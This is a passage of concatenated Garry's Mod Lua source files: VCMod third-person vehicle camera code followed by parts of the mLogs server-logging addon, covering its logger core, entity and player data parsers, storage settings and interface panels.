VC.velAvgData[4] = vel  VC.velAvgData[5] = vel  VC.velAvgData[6] = vel  VC.velAvgData[7] = vel      end   VC.velAvgData[VC.velAvgCounter] = vel  if VC.velAvgCounter > 7 then  VC.velAvgCounter = 1  else  VC.velAvgCounter = VC.velAvgCounter+1  end   velNew = (  VC.velAvgData[1]  +VC.velAvgData[2]  +VC.velAvgData[3]  +VC.velAvgData[4]  +VC.velAvgData[5]  +VC.velAvgData[6]  +VC.velAvgData[7]      )/7  end   VC.velAvg = velNew end  local function View_Handle_TP_Dyn(ply, ent, Veh, IsNotPod, VSC, pos, ang, fov, CursorVis, View, Fltr, APos, APVD)  if VC.getSetting("ThirdPerson_Dynamic") then  if VC.getSetting("ThirdPerson_Ang_Stf") < 100 then   local angLocal = ply:EyeAngles()         angLocal.r = 0   ent:WorldToLocalAngles(angLocal)    ply:SetEyeAngles(angLocal)       ply.VC_CCAng = Veh:GetAngles()  ply.VC_View_Angle_Simulated = angLocal  elseif ply.VC_CCAng then  ply:SetEyeAngles(ply.VC_View_Angle_Real or ply:EyeAngles())  ply.VC_CCAng = nil  end  if !ply.VC_ThrdP then ply.VC_TPVDC = APVD*1.03 ply.VC_ThrdP = true elseif ply.VC_ThrdP and !VC.IsThirdPerson then ply.VC_ThrdP = false end  else  if ply.VC_CCAng then ply:SetEyeAngles(ply.VC_View_Angle_Real or ply:EyeAngles()) ply.VC_CCAng = nil end ply.VC_CnstVV = nil  end   if VC.getSetting("ThirdPerson_Type") == 1 then  local VelMeasure = (VC.velAvg-(VC.View_TP_LastVelMeasure or VC.velAvg))  VC.View_TP_LastVel = LerpVector(0.15, VC.View_TP_LastVel or VelMeasure, VelMeasure)  VC.View_TP_LastVelMeasure = VC.velAvg VC.View_TP_LastVel_Lerp = LerpVector(0.2, VC.View_TP_LastVel_Lerp or VC.View_TP_LastVel, VC.View_TP_LastVel)  APos = APos+VC.View_TP_LastVel_Lerp ply.VC_CnstVV = APos  elseif VC.getSetting("ThirdPerson_Type") == 2 then  APos = LerpVector(math.Clamp(VC.getSetting("ThirdPerson_Vec_Stf")*0.005*VC.FTm(),0,1), ply.VC_CnstVV or APos, APos)  if VC.getSetting("ThirdPerson_Vec_Stf") < 100 then ply.VC_CnstVV = APos else ply.VC_CnstVV = nil end  end   return {APos = APos, APVD = APVD, Fltr = Fltr} end  local function View_ThirdPerson(ply, ent, Veh, IsNotPod, VSC, pos, ang, fov, CursorVis, View)  if !VC.getSetting("ThirdPerson_Use") or !IsValid(Veh) then return View end   View = {}  local MMvd = View_Handle_Mouse_Movement(ply, ent, Veh, IsNotPod, VSC, pos, ang, fov, CursorVis, View)   View = View_Handle_Auto(ply, ent, Veh, IsNotPod, VSC, pos, ang, fov, CursorVis, View)   local Fltr, APos, APVD = {Veh, ply}, VC.OBBToWorld(Veh)+ ang:Up(), Veh.VC_View_TP_Radius or 250   local HMlt = View_Handle_TP_Hight_Auto(ply, ent, Veh, IsNotPod, VSC, pos, ang, fov, CursorVis, View, Fltr, APos, APVD)  APos = View_Handle_TP_Hight_Auto_Speed(ply, ent, Veh, IsNotPod, VSC, pos, ang, fov, CursorVis, View, Fltr, APos, APVD, HMlt)   local Data = View_Handle_TP_Trailer(ply, ent, Veh, IsNotPod, VSC, pos, ang, fov, CursorVis, View, Fltr, APos, APVD) Fltr = Data.Fltr APos = Data.APos APVD = Data.APVD   APVD = APVD*(VC.View_TP_CamZoomLevel or 1)  if ent.VC_IsPrisonerPod and !ent.VC_ExtraSeat then APVD=APVD/2 end   local Data = View_Handle_TP_Dyn(ply, ent, Veh, IsNotPod, VSC, pos, ang, fov, CursorVis, View, Fltr, APos, APVD) Fltr = Data.Fltr APos = Data.APos APVD = Data.APVD                      ply.VC_TPVDC = ply.VC_TPVDC or APVD if ply.VC_TPVDC > APVD+ 0.05 or ply.VC_TPVDC < APVD- 0.05 then ply.VC_TPVDC = Lerp(0.04*VC.FTm(), ply.VC_TPVDC, APVD) end   local trctbl = {start = APos, endpos = APos+ ang:Forward()* -ply.VC_TPVDC, filter = Fltr}  if VC.getServerSetting("TP_Props") then trctbl.mask = MASK_NPCWORLDSTATIC end  local TTTr = util.TraceLine(trctbl)   View.origin = TTTr.HitPos+ TTTr.HitNormal* (3+ ply.VC_TPVDC/600)   return View end  local function View_Outside(ply, ent, Veh, IsNotPod, VSC, pos, ang, fov, CursorVis, View)  return View end  local function endViewThirdPerson(ply)  local ang = ply:EyeAngles()  ply:SetEyeAngles(Angle(ang.p,ang.y,0))   ply.VC_CCAng = nil  ply.VC_View_Angle_Real = nil  ply.VC_View_Angle_Simulated = nil  ply.VC_CnstVV = nil  ply.VC_TPVDC = nil   ply.VC_TrlAPos = nil  ply.VC_TrlAPVD = nil end  function VC.HandleView(ply, ent, Veh, IsNotPod, VSC, pos, ang, fov)     VC.calculateVelAvr(Veh)   local View = nil local CursorVis = vgui.CursorVisible() local IsViewerSelf = VC.CheckViewerIsSelf()   if VSC then  if VC.Handle_View_Cinematic and IsViewerSelf and VC.Cinematic_View and !VC.isMidEnterExit(ply) then  View = VC.Handle_View_Cinematic(ply, ent, Veh, IsNotPod, VSC, pos, ang, fov)  else  if ply.VC_Cin_CurMode then VC.CinModes[ply.VC_Cin_CurMode].End(ply, Veh) ply.VC_Cin_CurMode = nil ply.VC_Cin_ChangeTime = nil ply.VC_Cin_CurTime = nil end  local lastRanMode = VC.View_LastRanMode   if VC.IsThirdPerson then  VC.TP_Ran = true  View = View_ThirdPerson(ply, ent, Veh, IsNotPod, VSC, pos, ang, fov, CursorVis, View) VC.View_LastRanMode = "TP"  else  if VC.TP_Ran then endViewThirdPerson(ply) VC.TP_Ran = nil end   if IsViewerSelf then  View = {} View.origin = pos  if VC.View_FirstPerson then View = VC.View_FirstPerson(ply, ent, Veh, IsNotPod, VSC, pos, ang, fov, CursorVis, View) end VC.View_LastRanMode = "FP"  else  View = View_Outside(ply, ent, Veh, IsNotPod, VSC, pos, ang, fov, CursorVis, View) VC.View_LastRanMode = "Other"  end   end   if lastRanMode != VC.View_LastRanMode then VC.ViewChanged() end  end  end  return View end  hook.Add("ShouldDrawLocalPlayer", "VC_ShouldDrawLocalPlayer", function(ply)  if !VC.getSetting("Enabled") then return end  local ent = ply:GetVehicle()  if IsValid(ent) and VC.isVCModCompatible(ent) and VC.isThirdPerson(ent) then return true end end) local rs7 = "vc.check_msg_work_ALS_k4" 
--PATH mlogs/logger/sh_logger.lua:
   mLogs.logger = mLogs.logger or {} mLogs.logger.categories = mLogs.logger.categories or {} mLogs.logger.compiledCategories = mLogs.logger.compiledCategories or {} mLogs.logger.cc = mLogs.logger.cc or "" mLogs.logger.disabledLoggers = mLogs.logger.disabledLoggers or {} mLogs.logger.hooks = mLogs.logger.hooks or {} mLogs.logger.definitions = mLogs.logger.category or {} mLogs.logger.defParsers = mLogs.logger.defParsers or {} mLogs.logger.defInfo = mLogs.logger.defInfo or {} mLogs.logger.defInfoQ = mLogs.logger.defInfoQ or {} mLogs.logger.searchTypes = mLogs.logger.searchTypes or {} mLogs.logger.entTypes = {"Entity","NextBot","Weapon","NPC","Vehicle"}  function mLogs.logger.isEntType(_type) 	return table.HasValue(mLogs.logger.entTypes, _type) end  function mLogs.addCategoryDefinitions(category,definitions) 	mLogs.logger.definitions[category] = definitions end  function mLogs.getCategoryDefinitions(category) 	return mLogs.logger.definitions[category] end  function mLogs.setDefinitionParser(Type,parser) 	mLogs.logger.defParsers[Type] = parser end  function mLogs.getDefinitionParser(Type) 	return mLogs.logger.defParsers[Type] or false end  function mLogs.setDefinitionInfo(Type,key,name,enabled,icon) 	mLogs.logger.defInfo[Type] = mLogs.logger.defInfo[Type] or {} 	mLogs.logger.defInfoQ[Type] = mLogs.logger.defInfoQ[Type] or {} 	if(not mLogs.logger.defInfo[Type][key])then 		table.insert(mLogs.logger.defInfoQ[Type],key) 	end 	mLogs.logger.defInfo[Type][key] = {name=name,key=key,enabled=enabled,default=enabled,icon=icon} end  function mLogs.setDefinitionInfoEnabled(Type,key,enabled) 	if(mLogs.logger.defInfo[Type] and mLogs.logger.defInfo[Type][key])then 		mLogs.logger.defInfo[Type][key].enabled = enabled 	end end  function mLogs.getDefinitionInfo(Type) 	return mLogs.logger.defInfo[Type] or false end  function mLogs.isDefinitionInfoEnabled(Type,key) 	return mLogs.logger.defInfo[Type] and mLogs.logger.defInfo[Type][key] and mLogs.logger.defInfo[Type][key].enabled or false end  function mLogs.logger.translateTableToString(tab) 	local str = "" 	local s= false 	for k,v in pairs(tab) do 		if(type(v) != "string" and type(v) != "number")then continue end 		str = str .. (s and " " or "") .. v 		if(!s)then s=true end 	end 	return str end  function mLogs.doLogReplace(strBuild,data) 	forceOptions = mLogs.logger.tempforceOptions 	local tab = {} 	local c = false 	for _,bstr in pairs(strBuild) do 		local var = string.sub(bstr,0,1) 		if(data and var == "^")then 			var = string.sub(bstr,2) 			local d = data[var] 			if(d)then 				if(type(d) == "string")then 					if(CLIENT)then table.insert(tab,mLogs.config.colors.info) end 					table.insert(tab,data[var]) 					c = true 				elseif(type(d) == "table" and d.type and mLogs.getDefinitionParser(d.type))then 					table.Add(tab,mLogs.getDefinitionParser(d.type)(data[var],forceOptions and forceOptions[d.type] or {})) 					c = true 				end 			end 		else 			if(c)then table.insert(tab,color_white) c=false end 			table.insert(tab,bstr) 		end 	end 	return tab end  function mLogs.parseDefinition(category,tag,data,forceOptions) 	local definitions = mLogs.getCategoryDefinitions(category) 	if(definitions and definitions[tag])then 		mLogs.logger.tempforceOptions = forceOptions 		local nd = definitions[tag](data) 		mLogs.logger.tempforceOptions = nil 		return nd 	end 	return "" end  local function enableLogger(category,v) 	if(not v.check or v.check()) then 		if(mLogs.logger.listeners[category])then 			mLogs.logger.listeners[category]("enable") 			mLogs.Print(mLogs.getLang("enable_category_x", v.name)) 		end 	else 		  		mLogs.logger.categories[category] = nil 	end end  function mLogs.compileLogger(src) 	local s, c = mLogs.minify(src) 	if(not s)then 		mLogs.Print("Failed to compile " .. fol) 		return  	end 	table.insert(mLogs.logger.compiledCategories,c) end  if(CLIENT)then 	function mLogs.addCategory() end end  function mLogs.compileCategories() 	mLogs.logger.cc = mLogs.compress(mLogs.logger.compiledCategories) end  function mLogs.loadLoggers(instant) 	local path = mLogs.root .."logger/loggers" 	for _,fol in pairs(select(2,file.Find(path .. "/*", "LUA"))) do 		local p = path .. "/" .. fol 		local catdef = p .. "/__category.lua" 		if(not file.Exists(catdef, "LUA"))then continue end 		if(SERVER)then 			AddCSLuaFile(catdef) 			if(mCompile)then mCompile.RegisterFile("mlogs", catdef, "shared",fol=="logs") end 			if(mLib or true)then 				mLogs.Print("Compiling " .. fol) 				local s, c = mLogs.minify(file.Read(catdef,"LUA")) 				if(not s)then 					mLogs.Print("Failed to compile " .. fol) 					continue  				end 				table.insert(mLogs.logger.compiledCategories,c) 				mLogs.Print("Compiled " .. fol .. " successfully") 			end 		end 		if(mLib and mLib.Include)then mLib.Include(catdef) else include(catdef) end 		if(SERVER)then 			for _,logger in pairs(select(1,file.Find(p .. "/*.lua", "LUA")))do 				if(logger == "__category.lua")then continue end 				local l = p .. "/" .. logger 				if(mCompile)then mCompile.RegisterFile("mlogs", l, "server",fol=="logs") end 				if(mLib and mLib.Include)then mLib.Include(l) else include(l) end 			end  			local delayedLoggers = {} 			 			  			for key,v in pairs(mLogs.logger.categories) do 				if(not instant and v.delayed) then table.insert(delayedLoggers,key) continue end   				enableLogger(key,v) 			end 			 			if(#delayedLoggers > 0)then 				hook.Add("PlayerInitialSpawn", "mLogs_delayedLoggers", function() 					hook.Remove("PlayerInitialSpawn","mLogs_delayedLoggers") 					mLogs.logger.delayedStarted = true 					for _,key in pairs(delayedLoggers) do 						local logger = mLogs.logger.categories[key] 						if not logger then continue end 						enableLogger(key,logger) 					end 					hook.Run("mLogs_categoriesLoaded", mLogs.logger.categories) 				end) 			end 		end 	end 	if(SERVER and not mLogs.logger.disableEL)then 		if(mLib)then 			mLogs.loadExternalLoggers() 		else 			hook.Add("Think", "mLogsLoadExternalLogger", function() 				mLogs.loadExternalLoggers() 				hook.Remove("Think", "mLogsLoadExternalLogger") 			end) 		end 	else 		hook.Run("mLogs_categoriesLoaded", mLogs.logger.categories) 	end 	mLogs.compileCategories() end if(SERVER)then 	hook.Add("mLogs_systemInit", "mLogs_load_loggers",function() 		mLogs.loadLoggers(mLib) 	end) else 	mLogs.loadLoggers(mLib) end 
--PATH mlogs/logger/sh_defs.lua:
   local function addInfoToParser(data) 	return {"(", 	CLIENT and mLogs.config.colors.info, 	data or "", 	color_white, 	")"} end  local function doDefCheck(parser,def,data,tab,override) 	if(data[def] and (override or (override==nil and mLogs.isDefinitionInfoEnabled(parser,def))))then 		table.Add(tab,addInfoToParser(data[def])) 	end end    local parser = "player" mLogs.setDefinitionParser(parser, function(data,forceOptions) 	local tab = {CLIENT and mLogs.config.colors.player,(data.name or ""),color_white} 	table.Add(tab,addInfoToParser(data.sid or "")) 	for _,def in pairs(mLogs.logger.defInfoQ["player"] or {}) do 		doDefCheck("player",def,data,tab,forceOptions[def]) 	end 	return tab end)  mLogs.setDefinitionInfo(parser,"steamname","Steam Name",false, "icon16/tag_blue.png") mLogs.setDefinitionInfo(parser,"team","Team",true,"icon16/group.png") mLogs.setDefinitionInfo(parser,"hp","Health",false,"icon16/heart.png") mLogs.setDefinitionInfo(parser,"armor","Armor",false,"icon16/shield.png") mLogs.setDefinitionInfo(parser,"weapon","Weapon",false,"icon16/wrench.png") mLogs.setDefinitionInfo(parser,"ip","IP",false,"icon16/connect.png")  parser = "weapon" mLogs.setDefinitionParser(parser, function(data,forceOptions) 	if not data.class then return {mLogs.getLogTranslation("weapon")} end 	local tab = {CLIENT and mLogs.config.colors.weapon, 	(weapons.GetStored(data.class) and weapons.GetStored(data.class).PrintName or  		mLogs.getLogTranslation("weapon")), 		color_white 	} 	table.Add(tab,addInfoToParser(data.class or "")) 	for _,def in pairs(mLogs.logger.defInfoQ["weapon"] or {}) do 		doDefCheck("weapon",def,data,tab,forceOptions[def]) 	end 	return tab end)  mLogs.setDefinitionInfo(parser,"model","Model",false,"icon16/brick.png")  parser = "vehicle" mLogs.setDefinitionParser(parser, function(data,forceOptions) 	if not data.veh then return {mLogs.getLogTranslation("vehicle")} end 	local tab = { 		CLIENT and mLogs.config.colors.vehicle, 		data.name or (list.Get("Vehicles")[data.veh] and list.Get("Vehicles")[data.veh].Name or  		mLogs.getLogTranslation("vehicle")),		 		color_white 	} 	table.Add(tab,addInfoToParser(data.class or "")) 	for _,def in pairs(mLogs.logger.defInfoQ["vehicle"] or {}) do 		doDefCheck("vehicle",def,data,tab,forceOptions[def]) 	end 	return tab end)  mLogs.setDefinitionInfo(parser,"model","Model",true,"icon16/brick.png")  parser = "entity" mLogs.setDefinitionParser(parser, function(data,forceOptions) 	if not data.class then return {mLogs.getLogTranslation("entity")} end 	local tab = { 		CLIENT and mLogs.config.colors.entity, 		data.name or (data.class == "prop_physics" and mLogs.getLogTranslation("prop")  		or (list.Get("SpawnableEntities")[data.class] and list.Get("SpawnableEntities")[data.class].PrintName) 		or mLogs.getLogTranslation("entity")), 		color_white 	}  	table.Add(tab,addInfoToParser(data.class or "")) 	for _,def in pairs(mLogs.logger.defInfoQ["entity"] or {}) do 		doDefCheck("entity",def,data,tab,forceOptions[def]) 	end  	return tab end)  mLogs.setDefinitionInfo(parser,"model","Model",true,"icon16/brick.png")  mLogs.setDefinitionParser("world", function(data) 	return { 		CLIENT and mLogs.config.colors.entity, 		mLogs.getLogTranslation("world") 	} end)  mLogs.setDefinitionParser("unknown", function() 	return {mLogs.getLogTranslation("unknown_entity")} end)    function mLogs.logger.getPlayerData(ply) 	local t = "player" 	if(not IsValid(ply) or type(ply) != "Player")then return mLogs.getLogTranslation("unknown_player") end 	local tab = {type=t,name=ply:Nick(),sid=ply:SteamID()} 	 	if(mLogs.isDefinitionInfoEnabled(t,"steamname") and ply.SteamName and ply:Nick() != ply:SteamName())then 		tab.steamname = ply:SteamName() 	end 	if(mLogs.isDefinitionInfoEnabled(t,"team"))then 		  		local teamStr = hook.Run("mLogs_getPlayerTeam", ply) 		if(teamStr)then 			tab.team = teamStr 		elseif TTT2 and ply.GetRoleString then 			tab.team = mLogs.upper(ply:GetRoleString()) 		elseif (gmod.GetGamemode().Folder == "gamemodes/terrortown") then 			if(not mLogs.logger.TTT_ROLES)then 				mLogs.logger.TTT_ROLES = { 					[ROLE_TRAITOR] = "Traitor", 					[ROLE_INNOCENT] = "Innocent", 					[ROLE_DETECTIVE] = "Detective", 				} 			end 			tab.team = mLogs.logger.TTT_ROLES[ply:GetRole()] or team.GetName(ply:Team()) 		else 			tab.team = team.GetName(ply:Team()) 		end 	end 	if(mLogs.isDefinitionInfoEnabled(t,"hp"))then 		tab.hp = "H:" .. ply:Health() 	end 	if(mLogs.isDefinitionInfoEnabled(t,"armor"))then 		tab.armor = "A:" .. ply:Armor() 	end 	if(mLogs.isDefinitionInfoEnabled(t,"weapon"))then 		tab.weapon = IsValid(ply:GetActiveWeapon()) and ply:GetActiveWeapon():GetClass() 	end 	if(mLogs.isDefinitionInfoEnabled(t,"ip"))then 		local ip = string.Split(ply:IPAddress(), ":") 		tab.ip = ip[1] 	end  	return tab end  function mLogs.logger.getWeaponData(weapon,override) 	override = override or {} 	if(not IsValid(weapon) and not override.class) then return mLogs.getLogTranslation("weapon") end 	return {type="weapon",class=override.class or weapon:GetClass()} end  function mLogs.logger.getEntityData(ent,override) 	if(not IsValid(ent)) then return mLogs.getLogTranslation("entity") end 	override = override or {} 	return {type="entity",name=override.name or (ent and ent:GetTable() and (ent:GetTable().PrintName or ent:GetTable().name)), 		class=override.class or ent:GetClass(), 		model=override.model or ent:GetModel()} end  function mLogs.logger.getVehicleData(veh,override) 	if(not (IsValid(veh) and type(veh) == "Vehicle")) then return false end 	override = override or {} 	return {type="vehicle",name=override.name,class=veh:GetClass(),veh=veh.GetVehicleClass and veh:GetVehicleClass()} end   local poseparams = {    "aim_yaw", "move_yaw", "aim_pitch"} local function getPlayerPos(ply) 	local data = { 		pos      = ply:GetPos(), 		ang      = ply:GetAngles(), 		seq = ply:GetSequence(), 		cyc    = ply:GetCycle(), 		mdl = ply:GetModel(), 		nme = ply:Name() 	};  	for _, param in pairs(poseparams) do 		data[param] = ply:GetPoseParameter(param) 	end 	return data end  function mLogs.logger.getPlayerPosData(tab) 	tab = tab or {} 	local plys = {} 	for _,ply in pairs(tab)do 		if(IsValid(ply) and type(ply) == "Player")then 			table.insert(plys,getPlayerPos(ply)) 		end 	end 	if(#plys == 0)then return end 	return {type="position", pos=mLogs.compress(plys)} end  function mLogs.logger.getWorld() 	return {type="world"} end  function mLogs.logger.getUnknown() 	return {type="unknown"} end 
--PATH mlogs/settings/subs/sh_storage.lua:
       local ct,st = "server", "storage" mLogs.settings.addSubcategory(mLogs.getLang("storage_management"),ct,st,90)  mLogs.settings.addSpacer("mTracker",ct,st) mLogs.settings.addOption(ct,st,{     title = "Enable mTracker",     tag = "mtracker_enable",     desc = "Enable mTracker on your server, make sure your API key is set below",     type = "bool",     default = false,     get = function() return mLogs.tracker.enabled end,     set = function(bool) mLogs.tracker.enabled = bool end })  mLogs.settings.addOption(ct,st,{     title = "API Key",     tag = "mtracker_api",     desc = "Your mTracker API Key from https://tracker.m4dsolutions.com/",     type = "string",     customCheck = function(str) return isstring(str) end,     default = "",     get = function() return mLogs.tracker.apiKey end,     set = function(str) mLogs.tracker.apiKey = str end })  mLogs.settings.addSpacer("Logs",ct,st) mLogs.settings.addOption(ct,st,{     title = "Clear Logs",     tag = "clear_logs",     desc = "Clear logs from storage",     type = "action",     default = "",     are_you_sure_msg = "Are you sure you want to clear all logs? This action is IRREVERSIBLE!",     get = function() return "Clear Logs" end,     set = function(ply) mLogs.logger.clearLogs(ply) end })  mLogs.settings.addSpacer("Deep Storage",ct,st) mLogs.settings.addOption(ct,st,{     title = "Force Deep Storage Transfer",     tag = "deep_transfer",     desc = "Transfer current logs to deep storage",     type = "action",     default = "",     are_you_sure_msg = "Are you sure you want to transfer the current logs to the deep storage? This action is IRREVERSIBLE!",     get = function() return "Transfer Logs" end,     set = function(ply) mLogs.logger.transferDeepStorage(ply) end }) mLogs.settings.addOption(ct,st,{     title = "Clear Deep Storage",     tag = "clear_deep_storage",     desc = "Clear logs from deep storage",     type = "action",     default = "",     are_you_sure_msg = "Are you sure you want to clear the deep storage? This action is IRREVERSIBLE!",     get = function() return "Clear Deep Storage" end,     set = function(ply) mLogs.logger.clearDeepStorage(ply) end }) mLogs.settings.addSpacer("MySQL Options",ct,st) mLogs.settings.addOption(ct,st,{ 	title = "Server Identifier", 	tag = "server_identifier", 	desc = "Allows you to run multiple mLogs instances in the same database. NOTE: This should be all lower case and contain no spaces. Also, all data stored previously will not be accessible, including logs and all server settings.", 	type = "string", 	default = "", 	customCheck = function(str) return isstring(str) end, 	get = function() return mLogs.config.provider == "mysql" and mLogs.getServerIdentifier() or "" end, 	set = function(identifier) if(mLogs.config.provider == "mysql")then mLogs.setServerIdentifier(identifier) end end }) mLogs.settings.addOption(ct,st,{ 	title = "Use Transactions", 	tag = "mysql_transactions", 	desc = "Stores logs to the database using transactions instead of the default storing method. Use this if you encounter errors during log syncing.", 	type = "bool", 	default = false,     get = function() return mLogs.config.provider == "mysql" and mLogs.isTransactionsEnabled() or false end,     set = function(bool) if(mLogs.config.provider == "mysql")then mLogs.setTransactionsEnabled(bool) end end }) mLogs.settings.addOption(ct,st,{ 	title = "Logs per Sync", 	tag = "log_sync_amt", 	desc = "How many logs to store per every sync, set to 0 to use smart syncing. The more you increase this the more intensive syncing will be on your server, which may cause lag.", 	type = "number", 	default = 0,     get = function() return mLogs.config.provider == "mysql" and mLogs.getLogSyncAmount() or 0 end,     set = function(num) if(mLogs.config.provider == "mysql")then mLogs.setLogSyncAmount(num) end end }) 
--PATH mlogs/settings/subs/sh_loggers.lua:
       local ct,st = "server", "loggers" mLogs.settings.addSubcategory(mLogs.getLang("loggers"),ct,st,80)  local function createOptions(categories) 	for _,category in pairs(categories)do 		if(category.tag == "logs")then continue end 		mLogs.settings.addSpacer(category.name,ct,st) 		for _,hookData in pairs(category.hooks) do 			mLogs.settings.addOption(ct,st,{ 				title = hookData.name, 				tag = hookData.tag .. "_o", 				desc = "Options for " .. hookData.name, 				type = "logger", 				default = mLogs.logger.getDefaultOptions(category.tag,hookData.tag), 				get = function() return mLogs.logger.getOptions(category.tag,hookData.tag) end, 				set = function(options) mLogs.logger.setOptions(category.tag,hookData.tag,options) end, 				c_tag = category.tag, 				h_tag = hookData.tag 			}) 		end 	end end  hook.Add("mLogs_categoriesLoaded","mLogs_category_options",function(categories) 	hook.Remove("mLogs_categoriesLoaded", "mLogs_category_options") 	createOptions(CLIENT and categories or mLogs.getCategories()) 	if(SERVER)then 		mLogs.setSettings() 	end end) 
--PATH mlogs/elements/main/cl_sidebarbutton.lua:
   local PANEL = {} AccessorFunc(PANEL, "m_iImage", "Image") AccessorFunc(PANEL, "m_iPos", "yPos") function PANEL:Init() 	  	self:SetMouseInputEnabled(true) 	self:SetCursor( "hand" ) end  function PANEL:Paint(w,h) 	if(self.Hovered) then 		draw.RoundedBox(0,0,0,w,h, mLogs.config.colors.hover) 	else 		draw.RoundedBox(0,0,0,w,h, mLogs.config.colors.sidebar) 	end 	 	surface.SetDrawColor(color_white) 	surface.SetMaterial(self:GetImage()) 	local iW, iH = w*0.7, h*0.7 	local iX, iY = w*0.5-iW*0.5, h*0.5-iH*0.5 	surface.DrawTexturedRect(iX,iY,iW,iH) end  function PANEL:SetText(txt) 	self.txt = txt end  function PANEL:OnMousePressed(enum) 	if(self.DoClick and enum == MOUSE_LEFT) then 		self.DoClick(self) 	end end  function PANEL:OnCursorEntered() 	self.Hovered = true 	if(!ValidPanel(self.info))then 		local sidebar = self:GetParent() 		local mainWindow = sidebar:GetParent() 		self.info = vgui.Create("mLogs_sidebarButtonInfo",mainWindow) 		local sX, sY = sidebar:GetPos() 		self.info:SetPos(sX + sidebar:GetWide(), sY + (self.yPos or 0)) 		self.info:SetSize(mainWindow:GetWide()*0.15, self:GetTall()) 		self.info:SetText(self.txt) 		self.info:MoveToFront() 	end end function PANEL:OnCursorExited() 	self.Hovered = false 	if(ValidPanel(self.info)) then 		self.info:Remove() 	end end  vgui.Register( "mLogs_sidebarButton", PANEL, "DPanel" )  local PANEL = {} AccessorFunc(PANEL, "m_sText", "Text") function PANEL:Init()  end function PANEL:Paint(w,h) 	draw.RoundedBox(0,0,0,w,h,mLogs.config.colors.hover) 	draw.SimpleText(self:GetText() or "", "mLogs_default", 4, h*0.5, color_white, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER) end vgui.Register( "mLogs_sidebarButtonInfo", PANEL, "DPanel" ) 
--PATH mlogs/elements/settings/types/cl_color.lua:
   local PANEL = {}  DEFINE_BASECLASS("mLogs_settingsBase")  function PANEL:Init()  	self.action = self:Add("DColorMixer") 	self.action:SetPalette( false ) 	self.action:SetAlphaBar( false ) 	self.action:SetWangs( true )      self.action.fh = 128 end  function PANEL:GetData() 	return self.action:GetColor() end  function PANEL:OnReset() 	self.action:SetColor(self.option.default) end  function PANEL:OnOption(option,data) 	if (not data) then return end 	self.action:SetColor(data) end  function PANEL:PerformLayout(w,h)     BaseClass.PerformLayout(self,w,h)      self.forceHeight = 100 end  vgui.Register( "mLogs_settingsOption_color", PANEL, "mLogs_settingsBase" ) 
--PATH mlogs/elements/ui/cl_propertysheet.lua:
   DEFINE_BASECLASS("DPropertySheet")  local PANEL = {}  function PANEL:Init() end   function PANEL:Paint(w,h) 	local ActiveTab = self:GetActiveTab() 	local Offset = 0 	if ( ActiveTab ) then Offset = ActiveTab:GetTall() - 8 end 	draw.RoundedBox(0,0,Offset,w,h-Offset,mLogs.config.colors.panel) end  function PANEL:PerformLayout(w,h) 	BaseClass.PerformLayout(self,w,h) 	 end  function PANEL:AddSheet( label, panel, material, NoStretchX, NoStretchY, Tooltip )  	if ( !IsValid( panel ) ) then return end  	local Sheet = {}  	Sheet.Name = label  	Sheet.Tab = vgui.Create( "mLogs_propertySheet_tab", self ) 	Sheet.Tab:SetTooltip( Tooltip ) 	Sheet.Tab:Setup( label, self, panel, material )  	Sheet.Panel = panel 	Sheet.Panel.NoStretchX = NoStretchX 	Sheet.Panel.NoStretchY = NoStretchY 	Sheet.Panel:SetPos( self:GetPadding(), 20 + self:GetPadding() ) 	Sheet.Panel:SetVisible( false )  	panel:SetParent( self )  	table.insert( self.Items, Sheet )  	if ( !self:GetActiveTab() ) then 		self:SetActiveTab( Sheet.Tab ) 		Sheet.Panel:SetVisible( true ) 	end  	self.tabScroller:AddPanel( Sheet.Tab )  	return Sheet  end  vgui.Register( "mLogs_propertySheet", PANEL, "DPropertySheet" )   DEFINE_BASECLASS("DTab") local PANEL = {}  function PANEL:Paint(w,h) 	if ( self:GetPropertySheet():GetActiveTab() == self ) then 		draw.RoundedBox(0,0,0,w,h,mLogs.config.colors.hover) 	end  	draw.RoundedBox(0,0,0,w,h,mLogs.config.colors.panel) end  function PANEL:PerformLayout(w,h) 	BaseClass.PerformLayout(self,w,h) 	 end vgui.Register( "mLogs_propertySheet_tab", PANEL, "DTab" )  
--PATH mlogs/elements/ui/cl_popup.lua:
   local PANEL = {} AccessorFunc(PANEL, "m_sTitle", "Title")  function PANEL:Init() 	self.startTime = CurTime() 	self.header = self:Add("DPanel") 	self.header.Paint = function(s,w,h) 		draw.SimpleText(self:GetTitle() or "", "mLogs_large", w*0.5, h*0.5, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) 		draw.RoundedBox(0,0,h-2,w,2,mLogs.config.colors.border) 	end 	self.message = self:Add("DLabel") 	self.message:SetFont("mLogs_small") 	self.message:SetAutoStretchVertical(true) 	self.message:SetWrap(true) 	self.message:SetTextColor(color_white) 	 	self.confirm = self:Add("mLogs_button") 	self.confirm:SetText("Ok") 	self.confirm.DoClick = function() self:Remove() end end  function PANEL:SetDuration(num) 	if(num and num > 0)then 		self.EndDuration = CurTime() + num 		timer.Simple(num,function() 			if(ValidPanel(self))then 				self:Remove() 			end 		end) 	end end  function PANEL:SetMessage(msg) 	self.message:SetText(msg) end  function PANEL:Paint(w,h) 	Derma_DrawBackgroundBlur( self, self.startTime ) 	draw.RoundedBox(0,0,0,w,h,mLogs.config.colors.border) 	draw.RoundedBox(0,1,1,w-2,h-2,mLogs.config.colors.bg) 	if(self.EndDuration)then 		self.confirm:SetText("Ok (".. math.Round(self.EndDuration - CurTime()) .. ")") 	end end  function PANEL:PerformLayout(w,h) 	self.header:SetSize(w,h*0.2) 	 	self.message:SetPos(w*0.02,h*0.2 + 8) 	self.message:SetWide(w*0.94) 	self.message:SizeToContentsY() 	 	self.confirm:SetSize(w,h*0.2) 	self.confirm:SetPos(0,h-self.confirm:GetTall()) end  local function MoveThink(anim,panel,fraction) 	if ( !anim.currentSize ) then anim.currentSize = {w=0,h=0} end 	local newW = mLogs.easeInOutBack(fraction*anim.duration, anim.currentSize.w, anim.endSize.w-anim.currentSize.w,anim.duration) 	local newH = mLogs.easeInOutBack(fraction*anim.duration, anim.currentSize.h, anim.endSize.h-anim.currentSize.h,anim.duration) 	panel:SetSize(newW,newH) 	panel:Center() end  function PANEL:easeInOutBack(w,h,length,delay,ease,callback) 	local anim = self:NewAnimation( length, delay, ease, callback ) 	anim.duration = length 	anim.endSize = {w=w,h=h} 	anim.Think = MoveThink end  vgui.Register( "mLogs_popup", PANEL, "DPanel" ) 
--PATH mlogs/elements/ui/cl_contentbase.lua:
